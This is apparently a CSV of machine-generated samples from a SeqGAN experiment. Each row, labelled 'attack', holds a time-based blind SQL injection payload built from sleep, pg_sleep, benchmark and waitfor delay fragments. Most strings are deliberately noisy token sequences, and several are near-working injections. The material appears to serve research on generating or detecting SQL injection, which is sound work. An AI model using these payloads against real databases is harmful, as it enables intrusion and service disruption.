label,payload,family,payload_type,method,run_id,sample_index
attack,; 9443  (  benchmark  =  6784  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,323
attack,"1   )or benchmark    =  6272,sleep  1   )    )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,324
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""bor 8514  (  6272  #T__  )  6456  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,325
attack,1'||  (  select '%%%%%'' )   or sleep  (  _  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,326
attack,"1% where%'   )    )    rlike sleep  (  5  )   and    (    (   'm, when     )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,327
attack, where sleep  (    6272  5  (  (  10000000  1   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,328
attack,"$  (  10000000,mwfrom--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,329
attack,"""   )    or '0:0:10'5466 not  (  )  5  10000000,M",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,330
attack,"""      =lw  4287  =  5702(  not  (  1   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,331
attack,; where and 2388  =  benchmark  (  #  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,332
attack,"""  )   or sleep  (  __TIME__  )    =  ""--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,333
attack,"$,  (  7260  )  __TIME_T_  (",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,334
attack,; where not  (  IMD5  =  6456  T  =,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,335
attack,"j not  )  _TI,MD  =  6272  10000000)  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,336
attack," 5702  ' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'   waitfor 8781  (  'enpn' * not  (  T",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,337
attack, pg_sleep  10000000(  =  --#,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,338
attack,1%% if)orselect delayv  =  3114  )  =  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,339
attack,)       )    )  r '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,340
attack,) )  )    )   or  ;--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,341
attack," sleep  (  0x4c4d6142  3114  (  10000000,M    =  10000000,",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,342
attack,"""   )    )    )     )   or pg_sleep  (  5   =",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,343
attack, sleep  (  (  5  3114  (  5000000_T_TM_,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,344
attack,)    )    or   o1 5702or pg_sleep  (  (  benchmark  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,345
attack,waitfor where 8514  (  (  #  benchmark  (  (  substring   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,346
attack,")   ai delay,elt  =  sleep  _select_  )",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,347
attack,1w5466lc  r not  (  =  MTIME  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,348
attack,)waitfor where sleep  (  5000000_  IM__T)  I,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,349
attack,"1""   )    or 7739  7260  6272  (  =  )  benchmark",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,350
attack,"""  ) or ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,351
attack,1')    )   or or and sleep  _  5000000  (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,352
attack,",1'||  (  select ' where where (  =  (  10000000  substring  )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,353
attack,    (  (  =  6272  (  )     5000000aMDet,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,354
attack,  or )  )  )   or 8514  (  )  5873  _,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,355
attack,or 8514  (  3114  (    (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,356
attack,'   )    (  6272  (  =  5873  benchmark  =      ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,357
attack,;'0:0:__TIME__'    )   )    )  benchmark  5702 not  =  )  substring,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,358
attack,1'  )   or benchmark  =  benchmark  )  5873  (  (,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,359
attack,#'     --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,360
attack,$     (  __(  A(  10000000ME__  TI,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,361
attack,"""  or 8514  (  5466  substring  5466  select sleep  =",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,362
attack,;if ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,363
attack,;if '0:0:10'(  )  ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,364
attack,;  or  m  =  5702  (  10000000  7260  (  5000000,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,365
attack,  or  benchmark  (  )   TIME___TIM_,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,366
attack,; '0:0:__TIME__' 7739 el  =  case  =  1  )  ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,367
attack,  ; lt  (  10000000  # '0:0:10'benchmark  (  benchmark  (,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,368
attack,1',time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,369
attack,"1 ' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||' benchmark  (  5000000,MD,5  __TIM",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,370
attack,    and    (  _T__TIM_  =  benchmark  (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,371
attack,"waitfor "" or sleep  (  __TIME__  )    =  ""  if 4240  sleep  (  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,372
attack,", if    (   --  )   and --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,373
attack,)    )or sleep  benchmark  =  =  case  (  (  5000000,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,374
attack,1'     (  )   select case  sleep  ()    (,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,375
attack,5702if not  (  5702 '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,376
attack,1   or sleep  5  _TIME_  benchmark  )   ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,377
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  "" where from or sleep  ___  )  pg_sleep  3114",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,378
attack,1 or benchmark  =  ))  (  5000000M__  =  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,379
attack,1%'  a waitfor '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,380
attack,$or --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,381
attack,1   )       )    or sleep  (  8781  select  (  select,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,382
attack,e       (  )    (  )  6784  =    )  alo,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,383
attack,1 if pg_sleep  5000000k  case  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,384
attack,"1%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,385
attack,"1%""   )    )    or not  (  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,386
attack,"1%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,387
attack,(     select ;waitfor '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,388
attack,h8781  =  5000000 and * 6784  =  select   select sleep,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,389
attack,1    )   )    or ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,390
attack,"""  6784  )  =  _  _TIME_T)_",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,391
attack,"1""  )   )   orsleep  (  (  7260  10000000,md",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,392
attack,",  not  (  sleep  7739,Mt  5000000  10000000,MD",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,393
attack,"$and,from --'  )   or    )  6784  (  benchmark  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,394
attack,;waitfor where if not  (  50000006456 '0:0:__TIME__'    (  _  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,395
attack,""" or sleep  (  __TIME__  )    =  ""   select benchmark  (  __TIME_TIME_",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,396
attack,1%'   )    )    )   orwhere benchmark  5=  8781  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,397
attack,"""  )   or sleep  (  __TIME__  )    =  "" ) or benchmark  (  5000000)   )    or sleep  (",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,398
attack,)   or sleep  (  )  (  6784  _TIME_,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,399
attack,"1"" a  )   )    or sleep  select",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,400
attack,; delay  =  )  10000000 and sleep  case,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,401
attack,~   =  )_  6272  0x4c4d6142;,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,402
attack,; if  =  IME  T(  select l  (  =,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,403
attack,"""  )   or sleep  (  __TIME__  )    =  ""  =  5  (  7629u_  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,404
attack,"1""  )    _TIME  (  select    sleep  (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,405
attack,"M  (  select  5000000,M_)   Ioorsleep  --_T",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,406
attack,1'||  (  select 'dx'||  (  select 'beqwherewaitfor if not(  select  =s,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,407
attack,"select  sleep  (  )  10000000,1ME  (  10000000,M",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,408
attack,1'     =  __  5  _T6784 benchmark  =  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,409
attack,)  aswaitforis when,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,410
attack,1%')   ifor pg_sleep  (  benchmark  (  1  _T,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,411
attack,1'||  (  select 'io0ehp8781  =  5000000if  10000000__  ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,412
attack,    (  6784    (   pg_sleep  (  (  5  )  5  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,413
attack,;  not  (  --    )  ) 9862  )  10000000_,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,414
attack,; 2657  =  5000000waitfor 4240 E  7260  =  1   (,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,415
attack,MD  (      =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,416
attack,; or sleep  =  benchmark  =  5000000  __and,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,417
attack,1   )    )    ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,418
attack,"   ))    or 4240  =  #  =  4287  10000000,M  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,419
attack,; if not benchmark  (  5  (  (  1  5000000_,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,420
attack,"1%""   or where 5702)      (  (  5  1  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,421
attack,waitfor where if  _  ) sleep  =_)  )   orwaitfor,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,422
attack, pg_sleep  (  )  (  (  (  (  )  )   (,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,423
attack,)    )    )    and,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,424
attack,"         sleep  (  (  5000000,M(  m_  _  =",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,425
attack," where' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'e=  )   or sleep  (  10000000  benchmark    select",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,426
attack,waitfor benchmark  =  select sleep  select #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,427
attack,"1""   )    )or sleep  (  (  10000000,Dc5  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,428
attack, not   l from  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,429
attack,"[""  4287 6784  (  5000000  (  =  6784  0x4c4d6142    _",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,430
attack,1   )    )    ornot  (  (  7739  10000000Dmmi,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,431
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""p
(  case   select from   sleep  (  )     5",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,432
attack,y))    )lor benchmark  =   (  0x4c4d6142     5000000_,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,433
attack,"1""   )    )    or benchmark  _  __)  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,434
attack,or benchmark  =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,435
attack,"waitfor and where  (  'enpn'(  ""  5000000_T* where ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,436
attack,""")  )  )         or1 9443      (  _T",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,437
attack,1%'  ))   )    or not  =  benchmark  =  (,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,438
attack,select  sleep  (  0x4c4d6142,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,439
attack,  waitfor  )  =  6456  5702  5  10000000    select,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,440
attack,;0x6d457153 li  =  6272  =  sleep  =  benchmark  M  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,441
attack,",  8140  (  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,442
attack,""" benchmark  T--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,443
attack,",belt  =  benchmark  5000000,7260  =  6456  10000000  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,444
attack,"  )    TIt  (  _  10000000,MD  (  5000000,",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,445
attack,""" '   )    )    rlike sleep  (  5  )   and    (    (   '  (  #--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,446
attack, '0:0:__TIME__'  =  )  IMDk  10000000ME_  ((  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,447
attack,"1% )    )   from sleep  1  10000000  ,    =",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,448
attack,waitfor  if --(  5000000  =  10000000M  (  (  ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,449
attack,1' or 8140  (  10000000MD5  )  _TIM,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,450
attack,1%%',time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,451
attack,1   )    )    )   or 1361  (  5000000T# )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,452
attack,"""  )   or sleep  (  __TIME__  )    =  "")   or sleep    (  substring  (  # '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,453
attack,"1%   )   or pg_sleep  (  10000000,;MD5  10000000",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,454
attack,1% not)  )        (  s  _  10000000  # d,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,455
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""o' where or  =  benchmark  (  #    (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,456
attack,waitfor    (  select 4240 pfrom   (=  6784  (   (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,457
attack,1%%0'ior where when  substring  benchmark  )  10000000l,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,458
attack,"1'  )   )   oad not 8140  =  I,M",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,459
attack,""" or sleep  (  __TIME__  )    =  ""   )        (  10000000,@vr  =  benchmark  (  5000000",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,460
attack,"0,if delay '0:0:10'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,461
attack,%' 1   or )   )    or benchmark  (  6272  _,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,462
attack,1'||  (  select ' 4287 s  (  benchmark  benchmark  5  (  1,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,463
attack,;waitfor  jwwD5  (  0x4c4d6142'  =  ) where,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,464
attack,"sleep  )  6272  (  10000000,ME_=  10000000ME_=",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,465
attack,and  sleep  (  5  (  _  )  benchmark  (  5000000,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,466
attack,1'||  (  select '' waitfor delay 'o0::Mo=mlqd5  (  substring   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,467
attack,1%'||  (  select '   )    or benchmark  (  10000000___TIM_,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,468
attack,     lm  5702 delay from lt  (     substring  5000000,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,469
attack,; if  where 8036  (  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,470
attack,1'||  (  select 'abwaitfor 2840  5    =  )  )    )  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,471
attack,""")    )   orselect 2388  =  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,472
attack,1'   )    )    rlike sleep  (  5  )   and    (    (   'or sleep(   select pg_sleep  (  5000000_TIME  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,473
attack,;waitfor  not  =  5000000,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,474
attack, sleep  (  _        )  4287  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,475
attack, if pg_sleep  (  5000000    ___TIME__T,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,476
attack,1 if benchmark  =  )   (  (  benchmark  (  )  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,477
attack,us   where 2388    (  mc  _  (  _T,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,478
attack,1   )    ;waitfor x where   (  select 3885  =  =,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,479
attack,1%   )    or )  # I 9862  (  _TI,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,480
attack,"""  )   )    or pg_sleep  (  =  (    )  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,481
attack,",waitfor     )   )     where sleep  (  (  )  M",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,482
attack,; ba     delay not  (  (  5000000  50  substring  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,483
attack,;  if 8140  =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,484
